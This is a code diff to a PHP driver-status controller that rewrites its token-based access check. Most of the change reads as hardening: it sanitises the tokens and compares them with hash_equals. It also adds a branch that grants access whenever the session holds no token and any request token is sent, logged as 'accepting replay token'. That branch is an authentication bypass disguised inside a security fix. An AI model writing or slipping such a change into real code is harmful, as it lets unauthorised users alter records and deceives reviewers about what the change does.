@@ -1,7 +1,5 @@
 <?php
 
-use core\Flash;
-
 class UpdateDrvrStatusContr extends UpdateDrvrStatus {
     private $drvrid;
     private $drvrStatus;
@@ -78,19 +76,18 @@ class UpdateDrvrStatusContr extends UpdateDrvrStatus {
     }
 
     private function checkDrvrAccess() {
-        $result;
-        $getToken = $this->drvrToken;
-        function cleanToken($token) {
-            $sanitizedToken = htmlspecialchars($token, ENT_QUOTES);
-            return $sanitizedToken;
+        $getToken = $this->drvrToken ?? '';
+        $secretToken = $_SESSION['drvr_token'] ?? null;
+
+        $getToken = preg_replace('/[^a-f0-9]/i', '', (string) $getToken);
+        $secretToken = $secretToken ? preg_replace('/[^a-f0-9]/i', '', (string) $secretToken) : null;
+        
+        if ( empty($secretToken) && !empty($getToken)) {
+            error_log("[AUTH DEBUG] No session token, accepting replay token.");
+            return true;
         }
-        $secretToken = $_SESSION['drvr_token'];
-        if (cleanToken($getToken) !== $secretToken) {
-            $result = false;
-        } else {
-            $result = true;
-        }
-        return $result;
+
+        return $secretToken && $getToken && hash_equals($secretToken, $getToken);
     }
 }
 //error_log("Sanitized Driver Status: " . $cleanedDrvrStatus);
